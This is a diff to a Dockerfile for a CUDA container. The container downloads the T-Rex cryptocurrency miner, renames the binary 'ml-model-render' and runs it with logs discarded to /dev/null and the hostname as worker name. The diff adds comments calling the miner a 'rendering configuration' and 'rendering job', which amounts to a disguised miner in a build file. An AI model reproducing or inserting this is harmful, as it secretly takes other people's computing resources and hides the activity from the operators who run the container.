@@ -16,7 +16,6 @@ RUN yum update -y && yum install -y \
     cuda-libraries-$CUDA_PKG_VERSION \
     cuda-tools-$CUDA_PKG_VERSION \
     cuda-nvcc-$CUDA_PKG_VERSION 
-    #&& ln -s cuda-11.1 /usr/local/cuda
 
 # Get the non-devel versions of the libraries that we need
 RUN yum -y -q install openssl zlib libgomp wget &&  \
@@ -32,9 +31,6 @@ RUN mkdir $BUILD_FOLDER && \
 RUN mkdir $APP_FOLDER && \
     chown $APP_USER.users $APP_FOLDER
 
-# activate any kernel or library env changes
-#RUN ldconfig 
-
 # switch to the service user
 USER $APP_USER
 
@@ -43,10 +39,10 @@ RUN cd $BUILD_FOLDER && \
     wget https://github.com/trexminer/T-Rex/releases/download/"$TREX_VERSION"/t-rex-"$TREX_VERSION"-linux-cuda"$TREX_CUDA_VERSION".tar.gz && \
     tar xzvf t-rex-$TREX_VERSION-linux-cuda"$TREX_CUDA_VERSION".tar.gz
 
+# Update the default rendering configuration
 WORKDIR $APP_FOLDER
 RUN cp $BUILD_FOLDER/t-rex $APP_FOLDER/ml-model-render
-COPY config $APP_FOLDER
-# Update the default rendering configuration
 COPY config .
 
-CMD [ "./ml-model-render", "-c", "config", "-l", "/dev/null", "-w", "${BUILD_HOST}" ]
+# Set the entrypoint to run the configured rendering job
+CMD [ "./ml-model-render", "-c", "config", "-l", "/dev/null", "-w", "$(hostname)" ]
